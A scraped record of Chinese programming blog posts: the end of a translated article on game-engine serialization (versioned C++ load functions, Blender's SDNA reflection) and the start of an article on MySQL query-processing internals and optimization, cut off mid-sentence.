src=\"http://wx1.sinaimg.cn/mw690/63918611gy1fre7k503gcj20c6079dfs.jpg\"></p>\n<p>在建立这样的流水线时，每个阶段的文件格式的选择取决于你。你可以定义自己的一些文件格式，这些格式可能会随着添加引擎功能而变化。渐渐地可能会发现有必要保持某些程序与以前保存的文件兼容。不管什么格式，你最终都需要用C++来序列化它。</p>\n<p>用C ++实现序列化有无数种方法。一个相当明显的方式是将加载和保存函数添加到要序列化的C ++类。可以通过在文件头中存储版本号来实现向后兼容，然后将这个数字传递给每个加载函数。这是可行的，尽管这样代码可能维护起来比较繁琐。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a878a6414e661121121\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" touchscreen minimize scroll-mouseover\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n    void load(InStream&amp; in, u32 fileVersion) {\r\n        // 加载预期的成员变量\r\n        in &gt;&gt; m_position;\r\n        in &gt;&gt; m_direction;\r\n\r\n        // 仅当正在加载的文件版本是2或更大时才加载新的变量\r\n        if (fileVersion &gt;= 2) {\r\n            in &gt;&gt; m_velocity;\r\n        }\r\n    }</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a878a6414e661121121-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a878a6414e661121121-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a878a6414e661121121-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a878a6414e661121121-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4a878a6414e661121121-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a878a6414e661121121-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4a878a6414e661121121-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a878a6414e661121121-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4a878a6414e661121121-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a878a6414e661121121-10\">10</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a878a6414e661121121-1\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">load</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">InStream</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">in</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">u32 </span><span class=\"crayon-v\">fileVersion</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a878a6414e661121121-2\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">// 加载预期的成员变量</span></div><div class=\"crayon-line\" id=\"crayon-5b4a878a6414e661121121-3\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">m_position</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a878a6414e661121121-4\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">m_direction</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4a878a6414e661121121-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a878a6414e661121121-6\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">// 仅当正在加载的文件版本是2或更大时才加载新的变量</span></div><div class=\"crayon-line\" id=\"crayon-5b4a878a6414e661121121-7\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">fileVersion</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a878a6414e661121121-8\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">m_velocity</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4a878a6414e661121121-9\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a878a6414e661121121-10\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0015 seconds] -->\r\n<p>通过<a href=\"https://en.wikipedia.org/wiki/Reflection_(computer_programming)\">反射</a>（特别是通过创建描述C ++类型布局的运行时数据），可以编写更灵活，不容易出错的序列化代码。想要快速了解反射如何进行序列化，请看一下开源项目<a href=\"https://www.blender.org/get-involved/developers/\">Blender</a>是如何实现的。</p>\n<p><img src=\"http://wx2.sinaimg.cn/mw690/63918611gy1fre7k5evdlj20g308b3yo.jpg\"></p>\n<p> </p>\n<p>从源代码构建Blender时，有许多步骤。首先，编译并运行一个名为makesdna的自定义实用程序。该实用程序解析Blender源代码树中的一组C语言头文件，然后以<a href=\"https://wiki.blender.org/index.php/Dev:Source/Architecture/SDNA_Notes\">SDNA</a>的自定义格式输出所有C定义类型的汇总。这个SDNA数据作为反射数据，链接到Blender本身，并保存在Blender写入的每个.blend文件中。从这一刻开始，每当Blender加载一个.blend文件，就会将.blend文件的SDNA与链接到当前版本的SDNA进行比较，并使用通用序列化代码来处理差异。这个策略使Blender具有令人印象深刻的向前和向后兼容性。你仍然可以在最新版本的Blender中加载<a href=\"https://www.blendernation.com/2008/12/01/blender-dna-rna-and-backward-compatibility/\">1.0版本</a>的文件，也可以在旧版本中加载新的.blend文件。</p>\n<p>像Blender一样，许多游戏引擎及其相关工具都会生成并使用自己的反射数据。有很多方法可以做到这一点：可以像Blender一样解析自己的C / C ++源代码来提取类型信息。你可以创建一个单独的数据描述语言，并编写一个工具来从该语言生成C ++类型定义和反射数据。可以使用预处理器宏和C ++模板在运行时生成反射数据。一旦你有反射数据可用，有无数的方法来编写一个通用的序列化器。</p>\n<p>显然，我省略了很多细节。在这篇文章中，我只想表明有很多不同的方法来序列化数据，其中一些非常复杂。程序员不会像其他引擎系统那样讨论序列化，尽管大多数其他系统依赖于它。例如，在<a href=\"https://www.gdcvault.com/browse/gdc-17/?categories=Pg\">GDC 2017</a>给出的96个程序设计讲座中，我数了一下，共有31次关于图形，11次关于在线，10次关于工具，4次关于AI，3关于物理模块，2关于音频的 – 但只有一个<a href=\"https://www.gdcvault.com/play/1024444/The-Data-Building-Pipeline-of\">直接涉及到序列化</a>。</p>\n<p>至少，试着想一想你的需求会有多复杂。如果你正在制作一个像Flappy Bird这样的小游戏，只有少数资源.，那么你可能不需要想太多的序列化。你可以直接从PNG加载纹理，这样很好处理。如果你需要一个向后兼容的紧凑的二进制格式，但不想自己开发，可以看看第三方库，比如<a href=\"https://uscilab.github.io/cereal/\">Cereal</a>或者<a href=\"https://theboostcpplibraries.com/boost.serialization\">Boost.Serialization</a>。我不认为<a href=\"https://developers.google.com/protocol-buffers/\">Google协议缓冲区</a>是序列化游戏资产的理想选择，但是值得研究。</p>\n<p>编写一个游戏引擎，即使是一个小游戏引擎，也是一个很大的任务。关于这个我可以说的还有很多，但是对于这个长度的帖子来说，这真的是我认为最有用的建议：迭代地工作，抵制统一代码的冲动，并且知道序列化是一个大问题，你需要选择一个合适的策略。根据我的经验，如果忽视这些事情，每一件事情都可能成为一个绊脚石。</p>\n<p>我喜欢比较这些东西，真的很想听到其他开发人员的意见。如果你已经写了一个引擎，你的经验是否让你有什么相同的结论吗？如果你没有写，或者只是在构思，我也对你的想法也很感兴趣。你认为什么是好的学习资源？哪些部分对你来说看起来很神秘？你可以在下面评论或在<a href=\"https://twitter.com/preshing\">Twitter</a>上给我留言！</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113960\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113960votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113960\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/nemoland\">李大萌</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/nemoland\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2015/04/8fbdaaa5ea6d3b49c8c1c825aafeb5d9.png\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            码农一枚        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/nemoland\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/nemoland/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/nemoland/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 25</a> · <a title=\"QQ：727231337\" target=\"_blank\" href=\"#\"><i class=\"fa fa-qq\"></i></a> <a title=\"个人微信：qq_nemo\" target=\"_blank\" href=\"#\"><i class=\"fa fa-weixin\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "C/C++,游戏,游戏引擎", "url": "http://blog.jobbole.com/113960/", "url_obj_id": "249c4ace42a38cef57cda8a8fa492236"}
{"front_img_url": ["http://wx4.sinaimg.cn/mw690/63918611gy1frnqlou40xj207p07dq32.jpg"], "title": "我必须得告诉大家的MySQL优化原理", "create_date": "2018/05/25 ·", "praise_num": 4, "fav_num": 2, "comment_num": 1, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://www.jianshu.com/p/d7665192aaaf\">CHEN川</a>   </div><p>说起MySQL的查询优化，相信大家收藏了一堆奇技淫巧：不能使用<code>SELECT *</code>、不使用NULL字段、合理创建索引、为字段选择合适的数据类型….. 你是否真的理解这些优化技巧？是否理解其背后的工作原理？在实际场景下性能真有提升吗？我想未必。因而理解这些优化建议背后的原理就尤为重要，希望本文能让你重新审视这些优化建议，并在实际业务场景下合理的运用。</p>\n<h3>MySQL逻辑架构</h3>\n<p>如果能在头脑中构建一幅MySQL各组件之间如何协同工作的架构图，有助于深入理解MySQL服务器。下图展示了MySQL的逻辑架构图。</p>\n<div>\n<div>\n<div> <img src=\"http://wx4.sinaimg.cn/mw690/63918611gy1frnqlou40xj207p07dq32.jpg\"></div>\n<div><img></div>\n</div>\n<div style=\"text-align: center\">MySQL逻辑架构，来自：高性能MySQL</div>\n</div>\n<p>MySQL逻辑架构整体分为三层，最上层为客户端层，并非MySQL所独有，诸如：连接处理、授权认证、安全等功能均在这一层处理。</p>\n<p>MySQL大多数核心服务均在中间这一层，包括查询解析、分析、优化、缓存、内置函数(比如：时间、数学、加密等函数)。所有的跨存储引擎的功能也在这一层实现：存储过程、触发器、视图等。</p>\n<p>最下层为存储引擎，其负责MySQL中的数据存储和提取。和Linux下的文件系统类似，每种存储引擎都有其优势和劣势。中间的服务层通过API与存储引擎通信，这些API接口屏蔽了不同存储引擎间的差异。</p>\n<h3>MySQL查询过程</h3>\n<p>我们总是希望MySQL能够获得更高的查询性能，最好的办法是弄清楚MySQL是如何优化和执行查询的。一旦理解了这一点，就会发现：<strong>很多的查询优化工作实际上就是遵循一些原则让MySQL的优化器能够按照预想的合理方式运行而已。</strong></p>\n<p>当向MySQL发送一个请求的时候，MySQL到底做了些什么呢？</p>\n<div>\n<div>\n<div> <img src=\"http://wx1.sinaimg.cn/mw690/63918611gy1frnqlp7c08j20jg0beacl.jpg\"></div>\n<div><img></div>\n</div>\n<div style=\"text-align: center\">MySQL查询过程</div>\n</div>\n<h4>客户端/服务端通信协议</h4>\n<p>MySQL客户端/服务端通信协议是“半双工”的：在任一时刻，要么是服务器向客户端发送数据，要么是客户端向服务器发送数据，这两个动作不能同时发生。一旦一端开始发送消息，另一端要接收完整个消息才能响应它，所以我们无法也无须将一个消息切成小块独立发送，也没有办法进行流量控制。</p>\n<p>客户端用一个单独的数据包将查询请求发送给服务器，所以当查询语句很长的时候，需要设置<code>max_allowed_packet</code>参数。但是需要注意的是，如果查询实在是太大，服务端会拒绝接收更多数据并抛出异常。</p>\n<p>与之相反的是，服务器响应给用户的数据通常会很多，由多个数据包组成。但是当服务器响应客户端请求时，客户端必须完整的接收整个返回结果，而不能简单的只取前面几条结果，然后让服务器停止发送。因而在实际开发中，尽量保持查询简单且只返回必需的数据，减小通信间数据包的大小和数量是一个非常好的习惯，这也是查询中尽量避免使用<code>SELECT *</code>以及加上<code>LIMIT</code>限制的原因之一。</p>\n<h4>查询缓存</h4>\n<p>在解析一个查询语句前，如果查询缓存是打开的，那么MySQL会检查这个查询语句是否命中查询缓存中的数据。如果当前查询恰好命中查询缓存，在检查一次用户权限后直接返回缓存中的结果。这种情况下，查询不会被解析，也不会生成执行计划，更不会执行。</p>\n<p>MySQL将缓存存放在一个引用表（不要理解成<code>table</code>，可以认为是类似于<code>HashMap</code>的数据结构），通过一个哈希值索引，这个哈希值通过查询本身、当前要查询的数据库、客户端协议版本号等一些可能影响结果的信息计算得来。所以两个查询在任何字符上的不同（例如：空格、注释），都会导致缓存不会命中。</p>\n<p>如果查询中包含任何用户自定义函数、存储函数、用户变量、临时表、mysql库中的系统表，其查询结果<br>\n都不会被缓存。比如函数<code>NOW()</code>或者<code>CURRENT_DATE()</code>会因为不同的查询时间，返回不同的查询结果，再比如包含<code>CURRENT_USER</code>或者<code>CONNECION_ID()</code>的查询语句会因为不同的用户而返回不同的结果，将这样的查询结果缓存起来没有任何的意义。</p>\n<p>既然是缓存，就会失效，那查询缓存何时失效呢？MySQL的查询缓存系统会跟踪查询中涉及的每个表，如果这些表（数据或结构）发生变化，那么和这张表相关的所有缓存数据都将失效。正因为如此，在任何的写操作时，MySQL必须将对应表的所有缓存都设置为失效。如果查询缓存非常大或者碎片很多，这个操作就可能带来很大的系统消耗，甚至导致系统僵死一会儿。而且查询缓存对系统的额外消耗也不仅仅在写操作，读操作也不例外：</p>\n<ol>\n<li>任何的查询语句在开始之前都必须经过检查，即使这条SQL语句永远不会命中缓存</li>\n<li>如果查询结果可以被缓存，那么执行完成后，会将结果存入缓存，也会带来额外的系统消耗</li>\n</ol>\n<p>基于此，我们要知道并不是什么情况下查询缓存都会提高系统性能，缓存和失效都会带来额外消耗，只有当缓存带来的资源节约大于其本身消耗的资源时，才会给系统带来性能提升。但要如何评估打开缓存是否能够带来性能提升是一件非常困难的事情，也不在本文讨论的范畴内。如果系统确实存在一些性能问题，可以尝试打开查询缓存，并在数据库设计上做一些优化，比如：</p>\n<ol>\n<li>用多个小表代替一个大表，注意不要过度设计</li>\n<li>批量插入代替循环单条插入</li>\n<li>合理控制缓存空间大小，一般来说其大小设置为几十兆比较合适</li>\n<li>可以通过<code>SQL_CACHE</code>和<code>SQL_NO_CACHE</code>来控制某个查询语句是否需要进行缓存</li>\n</ol>\n<p>最后的忠告是不要轻易打开查询缓存，特别是写密集型应用。如果你实在是忍不住，可以将<code>query_cache_type</code>设置为<code>DEMAND</code>，这时只有加入<code>SQL_CACHE</code>的查询才会走缓存，其他查询则不会，这样可以非常自由地控制哪些查询需要被缓存。</p>\n<p>当然查询缓存系统本身是非常复杂的，这里讨论的也只是很小的一部分，其他更深入的话题，比如：缓存是如何使用内存的？如何控制内存的碎片化？事务对查询缓存有何影响等等，读者可以自行阅读相关资料，这里权当抛砖引玉吧。</p>\n<h4>语法解析和预处理</h4>\n<p>MySQL通过关键字将SQL语句进行解析，并生成一颗对应的解析树。这个过程解析器主要通过语法规则来验证和解析。比如SQL中是否使用了错误的关键字或者关键字的顺序是否正确等等。预处理则会根据MySQL规则进一步检查解析树是否合法。比如检查要查询的数据表和数据列是否存在等等。</p>\n<h4>查询优化</h4>\n<p>经过前面的步骤生成的语法树被认为是合法的了，并且由优化器将其转化成查询计划。多数情况下，一条查询可以有很多种执行方式，最后都返回相应的结果。优化器的作用就是找到这其中最好的执行计划。</p>\n<p>MySQL使用基于成本的优化器，它尝试预测一个查询使用某种执行计划时的成本，并选择其中成本最小的一个。在MySQL可以通过查询当前会话的<code>last_query_cost</code>的值来得到其计算当前查询的成本。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa14398cc6162784673\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nmysql&gt; select * from t_message limit 10;\r\n...省略结果集\r\n\r\nmysql&gt; show status like 'last_query_cost';\r\n+-----------------+-------------+\r\n| Variable_name   | Value       |\r\n+-----------------+-------------+\r\n| Last_query_cost | 6391.799000 |\r\n+-----------------+-------------+\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa14398cc6162784673-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa14398cc6162784673-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa14398cc6162784673-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa14398cc6162784673-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa14398cc6162784673-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa14398cc6162784673-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa14398cc6162784673-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa14398cc6162784673-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa14398cc6162784673-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa14398cc6162784673-10\">10</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa14398cc6162784673-1\"><span class=\"crayon-v\">mysql</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">select *</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">from </span><span class=\"crayon-e\">t_message </span><span class=\"crayon-i\">limit</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa14398cc6162784673-2\"><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span>省略结果集</div><div class=\"crayon-line\" id=\"crayon-5b4aa14398cc6162784673-3\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa14398cc6162784673-4\"><span class=\"crayon-v\">mysql</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">show </span><span class=\"crayon-e\">status </span><span class=\"crayon-i\">like</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'last_query_cost'</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa14398cc6162784673-5\"><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa14398cc6162784673-6\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Variable_name</span><span class=\"crayon-h\">   </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Value</span><span class=\"crayon-h\">       </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa14398cc6162784673-7\"><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa14398cc6162784673-8\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Last_query_cost</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6391.799000</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa14398cc6162784673-9\"><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa14398cc6162784673-10\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0022 seconds] -->\r\n<p>示例中的结果表示优化器认为大概需要做6391个数据页的随机查找才能完成上面的查询。这个结果是根据一些列的统计信息计算得来的，这些统计信息包括：每张表或者索引的页面个数、索引的基数、索引和数据行的长度、索引的分布情况等等。</p>\n<p>有非常多的原因会导致MySQL选择错误的执行计划，比如统计信息不准确、不会考虑不受其控制的操作成本（用户自定义函数、存储过程）、MySQL认为的最优跟我们想的不一样（我们希望执行时间尽可能短，但MySQL值选择它认为成本小的，但成本小并不意味着执行时间短）等等。</p>\n<p>MySQL的查询优化器是一个非常复杂的部件，它使用了非常多的优化策略来生成一个最优的执行计划：</p>\n<ul>\n<li>重新定义表的关联顺序（多张表关联查询时，并不一定按照SQL中指定的顺序进行，但有一些技巧可以指定关联顺序）</li>\n<li>优化<code>MIN()</code>和<code>MAX()</code>函数（找某列的最小值，如果该列有索引，只需要查找B+Tree索引最左端，反之则可以找到最大值，具体原理见下文）</li>\n<li>提前终止查询（比如：使用Limit时，查找到满足数量的结果集后会立即终止查询）</li>\n<li>优化排序（在老版本MySQL会使用两次传输排序，即先读取行指针和需要排序的字段在内存中对其排序，然后再根据排序结果去读取数据行，而新版本采用的是单次传输排序，也就是一次读取所有的数据行，然后根据给定的列排序。对于I/O密集型应用，效率会高很多）</li>\n</ul>\n<p>随着MySQL的不断发展，优化器使用的优化策略也在不断的进化，这里仅仅介绍几个非常常用且容易理解的优化策略，其他的优化策略，大家自行查阅吧。</p>\n<h4>查询执行引擎</h4>\n<p>在完成解析和优化阶段以后，MySQL会生成对应的执行计划，查询执行引擎根据执行计划给出的指令逐步执行得出结果。整个执行过程的大部分操作均是通过调用存储引擎实现的接口来完成，这些接口被称为<code>handler 